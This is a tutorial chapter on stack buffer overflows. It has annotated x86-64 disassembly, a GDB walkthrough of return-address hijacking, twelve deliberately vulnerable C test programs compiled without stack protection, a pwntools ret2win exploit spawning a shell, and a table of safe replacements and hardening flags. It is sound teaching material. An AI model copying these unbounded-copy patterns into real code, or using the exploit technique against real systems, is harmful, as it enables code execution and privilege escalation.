# Chapter 2 — Stack Buffer Overflows (12 test cases)

> The original, canonical memory-corruption bug ("Smashing the Stack for Fun and
> Profit", Aleph One, 1996). Master this and every other bug is a variation.

---

## 2.1 What it is

A **buffer overflow** writes **more data into a buffer than it can hold**, so the
write spills into *adjacent* memory. When the buffer is a **local variable on the
stack**, adjacent memory includes the saved frame pointer and the **return
address**. Overwrite the return address → when the function runs `ret`, the CPU
jumps wherever you told it.

## 2.2 Why it happens

C functions like `gets`, `strcpy`, `strcat`, `sprintf`, `scanf("%s")` copy bytes
**until a terminator**, with **no idea how big the destination is**. The size
lives only in the programmer's head; the copy loop never checks it.

```c
char buf[16];
gets(buf);    // reads a whole line, however long, into 16 bytes
```

## 2.3 The stack frame (the picture to memorize)

```
  high addresses
  +---------------------------+
  |   return address (8 B)    |  <- ret pops this into rip
  +---------------------------+
  |   saved RBP      (8 B)    |
  +---------------------------+  <- RBP
  |   buf[8..15]              |
  |   buf[0..7]               |  <- strcpy/gets writes here, UPWARD
  +---------------------------+  <- RSP
  low addresses
```

Reaching the return address from `buf[16]`:
`16 (buf) + 8 (saved RBP) = 24 bytes padding`, then the next 8 bytes land on the
saved return address. (Compilers may add alignment padding; always *measure* with
a cyclic pattern, don't assume.)

`call` pushes the return address; **`ret` blindly trusts `[rsp]`**. That blind
trust is the whole exploit.

---

## 2.3b Assembly deep-dive — watch the overflow at the instruction level

Take the vulnerable function and disassemble it so the abstract stack frame
becomes concrete machine code.

```c
// asm_demo.c
#include <string.h>
void vuln(char *in){ char buf[16]; strcpy(buf, in); }
int main(int c, char **v){ vuln(v[1]); }
```
```bash
gcc -g -O0 -fno-stack-protector -no-pie asm_demo.c -o asm_demo
objdump -d --no-show-raw-insn -M intel asm_demo | sed -n '/<vuln>:/,/ret/p'
```

Typical output (addresses vary), **annotated line by line**:

```asm
<vuln>:
  push   rbp               ; [1] save caller's frame pointer onto the stack.
                           ;     rsp -= 8, [rsp] = old rbp.
  mov    rbp, rsp          ; [2] set OUR frame pointer = current stack top.
                           ;     Now rbp anchors this frame; locals are at
                           ;     negative offsets from rbp.
  sub    rsp, 0x20         ; [3] reserve 0x20 (32) bytes for locals.
                           ;     buf[16] lives in this region. The compiler
                           ;     padded 16 -> 32 for 16-byte stack alignment.
  mov    QWORD PTR [rbp-0x18], rdi ; [4] spill the arg `in` (came in RDI per the
                           ;     SysV ABI) to a stack slot.
  mov    rdx, QWORD PTR [rbp-0x18] ; [5] rdx = in   (source for strcpy, arg2=rsi)
  lea    rax, [rbp-0x10]   ; [6] rax = &buf  (buf is at rbp-0x10).
  mov    rsi, rdx          ; [7] rsi = src  = in     (strcpy arg2)
  mov    rdi, rax          ; [8] rdi = dst  = &buf    (strcpy arg1)
  call   strcpy            ; [9] strcpy(dst,src): copies src until its NUL,
                           ;     NO length check -> writes past buf if src>15.
  nop
  leave                    ; [10] = mov rsp,rbp ; pop rbp. Tears down the frame
                           ;      and RESTORES rbp from [rbp] (the saved rbp).
  ret                      ; [11] pop [rsp] into rip and jump there.
```

Now map the overflow onto this frame. Relative to `rbp`:

```
   [rbp-0x10 .. rbp-0x01]  = buf[0..15]      (16 bytes, the destination)
   [rbp-0x18 .. rbp-0x11]  = spilled `in` + padding
   [rbp+0x00]              = saved RBP        (put there by `push rbp` at [1])
   [rbp+0x08]              = RETURN ADDRESS   (put there by `call vuln` in main)
```

So `strcpy` at `[9]` starts writing at `rbp-0x10` and marches **upward** toward
`rbp+0`. Byte counting from `buf`:

```
bytes  0..15  -> fill buf          (safe)
bytes 16..23  -> overwrite saved RBP   (8 bytes)
bytes 24..31  -> overwrite RETURN ADDRESS   <-- what `ret` at [11] will load
```

That is the 24-byte offset in action. Instructions `[10] leave` and `[11] ret`
are where the damage pays off:

- `leave` does `pop rbp` from the (now attacker-controlled) saved-RBP slot — so
  even a *partial* overwrite of that slot corrupts `rbp` for the caller.
- `ret` does `pop rip` from the saved-return-address slot — full `rip` control.

### Single-step it in GDB to *see* rip get hijacked

```bash
gdb -q ./asm_demo
```
```gdb
(gdb) break vuln
(gdb) run $(python3 -c 'print("A"*24 + "BBBBBBBB")')
(gdb) disassemble                 # confirm the instructions above
(gdb) x/6gx $rsp                  # dump 6 qwords from the stack top
(gdb) p $rbp                      # note the frame pointer
# step to just before `ret`:
(gdb) break *vuln+<offset-of-ret> # or: until the `leave`
(gdb) x/gx $rbp+8                 # the saved return address slot...
0x7fff...:  0x4242424242424242    # <-- it now holds "BBBBBBBB"!
(gdb) stepi                       # execute leave
(gdb) stepi                       # execute ret
(gdb) info registers rip
rip  0x4242424242424242           # <-- CPU jumped to attacker bytes
```

Seeing `rip = 0x4242424242424242` with your own `"B"*8` is the moment the
abstraction clicks: the return address is **just 8 bytes on the stack**, and
`ret` loads them into `rip` with zero validation.

### Why 16-byte alignment matters (the `movaps` gotcha)

Before `call`, the ABI requires `rsp % 16 == 8` *at function entry* (so that
after `push rbp` the frame is 16-aligned). libc routines like `system` use SSE
instructions (`movaps [rsp], xmm0`) that **fault** if `rsp` isn't 16-aligned.
That's why a ret2win/ret2libc payload often needs an extra bare `ret` gadget:
each `ret` pops 8 bytes, nudging `rsp` by 8 to fix alignment. pwntools' `ROP()`
handles it, but now you know *why* the gadget is there — it's an ABI rule, not
magic.

---

## 2.4 Test case 1 — the basic overflow & crash

```c
// t01_basic.c
#include <stdio.h>
#include <string.h>
void vuln(char *in){ char buf[16]; strcpy(buf, in); printf("%s\n", buf); }
int main(int c, char **v){ if(c>1) vuln(v[1]); }
```
```bash
gcc -g -O0 -fno-stack-protector -no-pie t01_basic.c -o t01
./t01 AAAA                               # fine
./t01 $(python3 -c 'print("A"*40)')      # Segmentation fault -> rip = 0x4141...
```
The crash *is* the proof: you overwrote the saved return address; `ret` jumped to
`0x4141414141414141` (unmapped) → SIGSEGV.

**Find the offset precisely** with a De Bruijn pattern (every 8-byte window
unique):
```bash
python3 -c 'from pwn import *; print(cyclic(80).decode())' | ./t01    # in gdb
# after crash:  cyclic -l <bytes in rip>     # prints the exact offset
```

---

## 2.5 Test case 2 — overwriting an adjacent variable (no rip needed)

You don't always need control of `rip`. Clobbering a neighboring local is enough
to change program logic:

```c
// t02_authflag.c
#include <stdio.h>
#include <string.h>
int main(void){
    char pass[16];
    volatile int authed = 0;    // adjacent local
    printf("password: ");
    gets(pass);                 // 17+ non-zero bytes spill into `authed`
    if (authed) puts("ACCESS GRANTED (overflowed into authed!)");
    else        puts("denied");
}
```
Lesson: **overflow corrupts neighbors.** Exact layout is compiler-dependent, but
the principle — a flag/length/pointer next to the buffer gets clobbered — is
universal and is the most common *real-world* consequence.

---

## 2.6 Test case 3 — ret2win (redirect to a hidden function)

```c
// t03_ret2win.c
#include <stdio.h>
#include <stdlib.h>
void win(void){ puts("[win] control hijacked!"); system("/bin/sh"); }
void vuln(void){ char buf[32]; gets(buf); }
int main(void){ setvbuf(stdout,0,_IONBF,0); puts("input:"); vuln(); }
```
```bash
gcc -g -O0 -fno-stack-protector -no-pie t03_ret2win.c -o t03
objdump -d t03 | grep '<win>:'          # win() address, e.g. 0x401162
```
```python
# exploit_t03.py
from pwn import *
e = ELF('./t03'); p = process('./t03')
p.sendline(b'A'*40 + p64(e.sym['win']))  # 32 buf + 8 saved rbp, then win()
p.interactive()
```
On x86-64 you may need an extra `ret` gadget before `win` for 16-byte stack
alignment (libc's `movaps` faults otherwise). `ROP(e)` in pwntools inserts it.
This alignment requirement is itself a lesson in how strict the ABI is.

---

## 2.7 Test case 4 — off-by-one (fencepost)

```c
// t04_offbyone.c
void f(char *src){
    char buf[16];
    for (int i = 0; i <= 16; i++)   // BUG: <= writes buf[16], one past
        buf[i] = src[i];
}
```
A single byte past the buffer can overwrite the **low byte of the saved RBP**
("frame-pointer overwrite"), which on the next `leave; ret` pivots the stack to
an attacker-influenced location. One byte is enough to matter — see also the
"poison NUL byte" heap variant (Chapter 4).

---

## 2.8 Test case 5 — off-by-one NUL from strncpy

```c
// t05_strncpy_nul.c
char buf[16];
strncpy(buf, src, sizeof buf);   // if strlen(src) >= 16, buf is NOT terminated
printf("%s", buf);               // prints past buf -> OOB read / leak
buf[strlen(buf)] = '!';          // strlen walks past -> OOB write
```
`strncpy` does **not** guarantee NUL termination — a classic footgun. Always
terminate explicitly (`buf[sizeof buf - 1] = 0;`) or use `snprintf`.

---

## 2.9 Test case 6 — attacker-controlled length / loop bound

The most common real shape: the *count* comes from input.

```c
// t06_lenfield.c
#include <stdio.h>
void recv_blob(void){
    char buf[64]; int n;
    scanf("%d", &n);                 // attacker controls n
    for (int i = 0; i < n; i++)      // no check n <= 64
        buf[i] = getchar();
}
```
`n = 200` overflows `buf` by 136 bytes. Length fields read from files/network are
the #1 source of real overflows; **always validate `n` against the real size.**

---

## 2.10 Test case 7 — unbounded `memcpy` / `read`

```c
// t07_memcpy.c
void handle(char *src, size_t srclen){
    char buf[128];
    memcpy(buf, src, srclen);        // srclen from the wire -> overflow
}
// also: read(fd, buf, attacker_len);  recv(fd, buf, big);
```
`memcpy`/`memmove`/`read`/`recv` are only as safe as the length you pass. The fix
is `memcpy(buf, src, srclen < sizeof buf ? srclen : sizeof buf)` or reject early.

---

## 2.11 Test case 8 — the `scanf`/`sprintf`/`strcat` family

```c
// t08_family.c
char buf[8];
scanf("%s", buf);                    // unbounded; use "%7s"
sprintf(buf, "Hello %s", name);      // format expansion overflows; use snprintf
strcat(buf, suffix);                 // appends with no size check; use strlcat
```
All three are the same bug wearing different names: no destination-size awareness.

---

## 2.12 Test case 9 — overflow via argv / environment

```c
// t09_argv.c
int main(int argc, char **argv){
    char path[64];
    strcpy(path, argv[1]);           // long argv[1] overflows path
    // env too: strcpy(buf, getenv("HOME"));
}
```
Local setuid binaries are attacked exactly this way — the attacker fully controls
`argv`/`envp`. (Historically, long env vars were also used to *place* shellcode
at a predictable address.)

---

## 2.13 Test case 10 — `alloca` / VLA with attacker size

```c
// t10_alloca.c
void f(int n){
    char *p = alloca(n);   // n from input: giant alloca blows the stack,
    ...                    // or negative/huge n corrupts the frame
}
void g(int n){ char vla[n]; ... }   // same problem (C99 VLA)
```
`alloca`/VLAs move `rsp` by an attacker-controlled amount → stack clash /
corruption. Avoid attacker-sized stack allocations entirely; use the heap with
checks, and compile with `-fstack-clash-protection`.

---

## 2.14 Test case 11 — array index write out of bounds

```c
// t11_index.c
int table[10];
int idx; scanf("%d", &idx);
table[idx] = 0x41414141;   // idx=50 or -3 writes far outside table
```
An unchecked **index** is a direct "write-what-where" into the stack/globals. Both
positive and **negative** indices are dangerous. Always `if ((unsigned)idx < 10)`.

---

## 2.15 Test case 12 — struct with buffer + pointer (intra-struct overflow)

```c
// t12_struct.c
struct conn { char name[32]; void (*cb)(void); };
void setname(struct conn *c, char *s){ strcpy(c->name, s); }  // overflows into cb
```
Overflowing `name` overwrites the **function pointer `cb`** that follows it in the
struct — the local-object analogue of a return-address overwrite. Reordering
fields (pointer first) or bounding the copy fixes it.

---

## 2.16 Impact summary

- **Arbitrary code execution** (return address / function-pointer overwrite).
- **Privilege escalation** (setuid binaries, daemons).
- **Auth / logic bypass** (adjacent-flag corruption).
- **Denial of service** (crashes).

Historic: **Morris Worm (1988)** `gets` in `fingerd`; **Code Red**, **Slammer**;
endless CVEs today (though NX/ASLR/canaries made stack RCE much harder — Ch.13).

---

## 2.17 The fixes (apply all that fit)

**Bound every copy to the destination size:**

| Dangerous | Safe replacement |
|-----------|------------------|
| `gets(b)` | `fgets(b, sizeof b, stdin)` |
| `strcpy(d,s)` | `snprintf(d, sizeof d, "%s", s)` / `strlcpy` |
| `strcat(d,s)` | `snprintf`/`strlcat` with remaining size |
| `sprintf(d,…)` | `snprintf(d, sizeof d, …)` |
| `scanf("%s",b)` | `scanf("%31s", b)` (width = size-1) |
| `memcpy(d,s,n)` | clamp `n` to `sizeof d`; validate first |

Then layer defenses (Chapter 13): **stack canary** (`-fstack-protector-strong`),
**NX**, **ASLR+PIE**, **FORTIFY** (`-D_FORTIFY_SOURCE=2 -O2`). Fuzz with **ASan**
(`-fsanitize=address`) — it catches every case above with a precise report. Prefer
**Rust** for new security-critical code.

---

## Recap
- Past-the-end stack writes hit **saved RBP** and the **return address**; `ret`
  then jumps to attacker data.
- It manifests 12 ways here — raw copies, off-by-one, attacker lengths, indices,
  argv/env, alloca/VLA, intra-struct — all the same root cause.
- Fix by **bounding copies/indices** + canary/NX/ASLR/FORTIFY + ASan.

Next: **[Chapter 3 — The heap & dynamic memory »](03-heap-internals.md)**
